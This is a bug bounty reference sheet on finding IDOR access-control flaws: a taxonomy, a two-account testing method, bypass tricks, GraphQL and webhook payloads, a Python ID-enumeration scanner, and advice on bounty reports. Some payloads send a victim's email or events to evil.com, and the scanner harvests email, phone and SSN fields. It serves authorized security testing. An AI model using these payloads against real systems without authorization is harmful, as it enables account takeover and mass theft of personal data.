# IDOR MASTER CLASS SHEET
*LoganSec, Bug Bounty Reference | April 2026*

---

## THE CORE MENTAL MODEL

IDOR is **not** just "change an ID in a URL."

IDOR = any situation where:
1. App uses user-supplied input to reference an object
2. App fails to verify **you're authorized** to access that object
3. You can manipulate that reference to reach unauthorized data

**Objects** can be: DB records, files, functions, endpoints, cloud resources
**References** can be: numeric IDs, UUIDs, hashes, encoded strings, filenames, emails, usernames, or combos

The test question: *"What can I do with this reference that I'm not supposed to be able to do?"*

---

## THE 7 IDOR TYPES

### Type 1: Direct Reference (Classic)
```
GET /account?id=12345  →  change to id=12346
```
Simple. Heavily tested. Still works on obscure endpoints.

### Type 2: Indirect / Second-Order
- Input stored, then used later to reference objects
- IDOR happens at **read time**, not write time
- Example: `POST /profile {"favorite_user": 999}` → `/favorites` returns user 999's private data

### Type 3: Blind IDOR (No Direct Feedback)
- You act, don't see result — check the **victim account** for impact
- Delete photo, change settings, unsubscribe — verify from Account B
- Requires two test accounts

### Type 4: UUID / Non-Sequential IDOR
"We use UUIDs, so it's not guessable" = wrong
**UUIDs leak from:**
- Other API responses (especially POST response bodies)
- JS files, public profile URLs, notification emails, shared links, WebSocket messages, error messages, HTML comments
- Mass assignment: try injecting `"user_id": "THEIR-UUID"` in POST bodies

### Type 5: Encoded / Obfuscated IDOR
```bash
echo "aW52b2ljZV8xMjMucGRm" | base64 -d  # → invoice_123.pdf
```
Patterns to decode: Base64, hex, URL encoding, custom (reverse/ROT13/XOR), MD5/SHA hashes
Once you see the pattern, generate and test the next values.

### Type 6: Composite IDOR (Multiple Parameters)
```
GET /api/message?user_id=100&message_id=456
```
Server checks if message 456 **exists** but not if user 100 **owns** it.
Test all combinations of your params vs victim's params.

### Type 7: Function-Level IDOR
Not about *viewing* data — about *actions*:
```
DELETE /api/users/123     → can you delete someone else's account?
POST /api/account/close   → is account_id pulled from POST body or session?
```
If the ID comes from the **request body** instead of the **session token** → critical.

---

## TESTING METHODOLOGY

### Setup (Every Target)
1. Create **two test accounts** (Attacker + Victim)
2. Map all CRUD operations for every object type
3. Note every ID pattern — numeric, UUID, encoded, filename

### The Testing Matrix
| Account   | Create Object | Note ID |
|-----------|--------------|---------|
| Account A | ✓            | ID-A    |
| Account B | ✓            | ID-B    |

Then as Account A:
- Read ID-B → should 403
- Update ID-B → should 403
- Delete ID-B → should 403
- Check Account B after each attempt

### Parameter Discovery Checklist
Where to look for ID parameters:
- URL path: `/user/123/profile`
- Query string: `?user_id=123`
- POST body (JSON): `{"user_id": 123}`
- POST body (form): `user_id=123`
- Headers: `X-User-ID: 123`
- Cookies: `user_id=123`
- WebSocket payload: `{"user_id": 123}`

---

## ADVANCED TECHNIQUES

### Parameter Pollution (Add IDs That Shouldn't Be There)
```json
POST /api/profile/update
{
  "name": "John",
  "email": "john@test.com",
  "user_id": 200
}
```
Server may accept undeclared fields. If it does → you just updated user 200's profile.

### HTTP Method Switching
```
GET /api/user/123   → 403 Forbidden
POST /api/user/123  → 200 OK
PUT /api/user/123   → 200 OK (modifies!)
```

### Content-Type Manipulation
```
Content-Type: application/json  → 403
Content-Type: application/x-www-form-urlencoded  → 200
```

### Header Injection
```
X-User-ID: 200
X-Account-ID: 200
X-Client-ID: 200
X-Original-User: 200
```

### Array / Wildcard Injection (Bypass "Protections")
```
?id[]=200
?id=*
?id=100,200,300
?id=-1          (sometimes returns first DB record)
?id=200%00      (null byte)
?id=200'        (may trigger SQL behavior)
```

### Export Function IDOR Chain
```
POST /api/export/request {"format": "csv", "user_id": 200}
→ Response: {"export_id": "abc123"}
GET /api/export/download?id=abc123
→ Downloads victim's complete data
```
Export endpoints often return **all** user data — highest severity per finding.

### The "current" Keyword Trick
```
GET /api/user/current/profile   → works (own data)
GET /api/user/123/profile       → also works if backend substitutes "current" poorly
```

---

## GRAPHQL IDOR

### Find Endpoints
```
/graphql  /api/graphql  /v1/graphql  /query  /api
```

### Test Introspection First
```json
{"query": "{ __schema { types { name } } }"}
```

### Query IDOR
```graphql
query { user(id: 200) { email phone privateData } }
```

### Mutation IDOR (Critical)
```graphql
mutation {
  updateUser(id: 200, input: {email: "attacker@evil.com"}) { success }
}
```

### Batch Query (Mass Exfil in One Request)
```graphql
query {
  u1: user(id: 100) { email }
  u2: user(id: 101) { email }
  ...100 entries...
}
```

---

## HIGH-VALUE IDOR SURFACES (Less Competition)

### File Downloads
```
GET /download?file=invoice_12345.pdf
```
Enumerate: `invoice_12346.pdf`, `12347.pdf`, etc.

### WebSocket Messages
```json
{"action": "get_user_data", "user_id": 200}
```
Most hunters never test WebSocket payloads.

### Webhook Registration
```json
POST /api/webhook/register {"url": "https://evil.com", "user_id": 200}
```
Registers to receive another user's event notifications.

### Mobile API Endpoints
- Less competition, APIs built fast, client-side validation gives false security
- Intercept with Burp + Android/iOS, test in Postman with modified IDs
- Batch operations especially vulnerable: `{"user_ids": [100, 200, 300]}` → returns all

### Pagination Exploitation
```
GET /api/messages?user_id=200&page=1&limit=1000
```

---

## TOOLS

### Burp Autorize Extension
- Set Attacker session + Victim session
- Browse as Attacker
- Autorize replays every request with Victim's session, flags response differences
- Best passive IDOR detection available

### Burp Intruder Payloads
- Numeric: type=Numbers, from=1, to=10000, step=1
- UUID pattern: `550e8400-e29b-41d4-a716-4466554400§00§`, payload=Hex
- Encoded IDs: generate plaintext variants → process with Base64 encoder macro

### Quick Python IDOR Scanner
```python
import requests

def test_idor(base_url, endpoint, id_param, start_id, end_id, token):
    headers = {"Authorization": f"Bearer {token}"}
    findings = []
    for uid in range(start_id, end_id + 1):
        url = f"{base_url}{endpoint}?{id_param}={uid}"
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            if any(k in r.text for k in ["email", "phone", "ssn", "address"]):
                findings.append({"id": uid, "url": url, "snippet": r.text[:200]})
                print(f"[!] IDOR at ID {uid}")
    return findings
```

---

## THE FULL IDOR CHECKLIST

**Parameter Locations**
- [ ] URL path parameter
- [ ] Query string
- [ ] POST body (JSON)
- [ ] POST body (form-encoded)
- [ ] Custom headers (X-User-ID, X-Account-ID, etc.)
- [ ] Cookies
- [ ] WebSocket payload

**ID Formats**
- [ ] Numeric (sequential, increment/decrement)
- [ ] Negative numbers
- [ ] UUID (look for leaks in other responses first)
- [ ] Base64 encoded
- [ ] Hex encoded
- [ ] Custom encoding
- [ ] Filename-based

**HTTP Methods**
- [ ] GET
- [ ] POST
- [ ] PUT
- [ ] PATCH
- [ ] DELETE

**CRUD Operations**
- [ ] Read (view another user's object)
- [ ] Update (modify another user's object)
- [ ] Delete (remove another user's object)
- [ ] Create (create on behalf of another user)

**Special Techniques**
- [ ] Parameter pollution (inject extra ID fields)
- [ ] Content-Type switching
- [ ] HTTP method switching
- [ ] Array/wildcard injection
- [ ] Second-order / indirect IDOR (stored input used later)
- [ ] Blind IDOR (verify impact on victim account)
- [ ] Export function IDOR
- [ ] GraphQL queries + mutations
- [ ] WebSocket payloads
- [ ] Mobile API endpoints
- [ ] Webhook registration
- [ ] "current" keyword bypass
- [ ] Batch operation endpoints

**Automation**
- [ ] Autorize extension running during manual browse
- [ ] Burp Intruder for numeric/UUID enumeration
- [ ] Custom script for endpoint-specific enumeration

**Documentation**
- [ ] Two test accounts created and IDs noted
- [ ] All findings have full end-to-end PoC
- [ ] Victim account verified for blind IDORs
- [ ] Impact quantified (X records, X users affected)

---

## REPORT STRUCTURE THAT GETS PAID

**Title format:**
`[Privilege Escalation Type] via IDOR in [Endpoint] Allows [Concrete Impact] Affecting [Scale]`

**Required sections:**
1. **Executive Summary** — what's exposed, how many users, what data types
2. **Steps to Reproduce** — two named test accounts, exact requests with headers, exact responses showing leak
3. **Impact Analysis** — data exposed, business consequences (GDPR, phishing, ATO chains), attack scenarios
4. **PoC artifacts** — script, video, screenshots of both legitimate and malicious request

**Words that get rejected:** "could", "might", "if an attacker were to"
**Words that get accepted:** "I accessed", "the response returned", "confirmed by logging into victim account"

**Severity anchors:**
- PII exposed (email, phone, address) → High
- Financial data / transactions → High-Critical
- Medical / SSN / passwords → Critical
- Mass enumeration possible (no rate limit) → escalates severity
- Chain with another bug (e.g., IDOR + password reset) → Critical

---

## IMPACT FRAMING QUICK REFERENCE

| Data Exposed | Users Affected | Severity | Bounty Range |
|---|---|---|---|
| Email only | 1 | Low-Medium | $50-500 |
| PII (name, email, phone) | 1 | Medium | $200-1K |
| PII (full profile) | 1K+ | High | $1K-5K |
| Financial / medical data | Any | High-Critical | $3K-15K |
| Mass enumeration (no rate limit) | All users | Critical | $5K-50K+ |

**The chain multiplier:** IDOR + weak password reset + predictable token = ATO chain. Report the chain, not the component. Each link you add multiplies severity.

---

## COMMON FALSE POSITIVE TRAPS

- **CORS "IDOR"** — CORS misconfiguration ≠ IDOR. Requires confirmed exploitability (origin reflection + credentials + sensitive endpoint). Do not submit until you have a full working chain.
- **Rate-limited enumeration** — if you can't enumerate at scale, mass impact claim is weaker
- **Admin-only access** — if the only way to trigger is admin credentials, it's not a typical IDOR
- **Self-referential** — accessing your own data is not a finding, even if the parameter is explicit

---

*Reference: BugHunter's Journal, "IDOR Mastery: From Basic ID Changes to Advanced Techniques" (Mar 2026) + HackerOne 2025 data*
